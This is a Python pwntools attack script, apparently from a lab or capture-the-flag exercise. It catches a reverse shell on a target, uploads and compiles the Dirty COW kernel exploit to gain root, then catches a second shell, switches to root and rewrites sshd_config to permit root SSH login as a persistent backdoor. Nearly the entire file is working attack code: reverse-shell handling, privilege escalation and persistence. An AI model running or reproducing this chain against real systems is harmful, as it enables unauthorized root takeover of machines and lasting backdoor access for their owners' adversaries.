#! /usr/bin/env python3
from pwn import *
import time
import subprocess
import os

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()
# Send dirty cow exploit code
with open(os.path.dirname(os.path.abspath(__file__))+'/dirty.c', 'r') as file:
    content = file.read()
    l.sendline("cat > dirty.c << EOF")
    l.sendline(content)
    l.sendline("EOF")
    file.close()
# Compile the exploit and run it
l.sendline("gcc dirty.c -o dirty -pthread -lcrypt && ./dirty easywin")
p = log.progress('Waiting 30 seconds for DirtyCow ...')
time.sleep(30)
p.success('DirtyCow OK')
l.close()

# Listen the reverse shell
l = listen(1234)
# Launch the reverse shell in background
p = subprocess.Popen(["python3", os.path.dirname(os.path.abspath(__file__))+"/reverse_shell_inject.py"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
l.wait_for_connection()

# Connect as root
l.sendline("su root")
time.sleep(2)
l.sendline("easywin")
time.sleep(2)
# Authorize ssh for root
l.sendline("echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config")
l.sendline("echo 'AllowUsers root' >> /etc/ssh/sshd_config")
l.sendline("service ssh restart")
l.interactive()
